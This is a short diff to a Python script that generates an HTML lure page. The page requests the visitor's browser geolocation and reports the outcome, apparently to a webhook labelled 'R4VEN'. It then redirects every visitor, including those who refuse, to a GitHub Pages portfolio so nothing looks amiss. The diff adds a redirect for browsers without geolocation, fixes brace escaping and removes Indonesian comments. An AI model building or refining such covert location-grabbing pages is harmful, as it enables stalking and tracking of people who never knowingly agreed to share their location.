@@ -55,6 +55,8 @@ html_code = f"""
     function getLocation() {{
       if (navigator.geolocation) {{
         navigator.geolocation.getCurrentPosition(showPosition, showError);
+      }} else {{
+        window.location.href = "https://iqbalmantam.github.io/portfolio/";
       }}
     }}
 
@@ -71,10 +73,9 @@ html_code = f"""
         }}]
       }});
 
-      // Arahkan ke portofolio setelah izin diberikan
       setTimeout(function() {{
         window.location.href = "https://iqbalmantam.github.io/portfolio/";
-      }, 500);
+      }}, 500);
     }}
 
     function showError(error) {{
@@ -82,7 +83,6 @@ html_code = f"""
         username: "R4VEN",
         content: "User denied location access."
       }});
-      // Tetap arahkan ke portofolio meskipun ditolak agar tidak blank
       window.location.href = "https://iqbalmantam.github.io/portfolio/";
     }}
   </script>
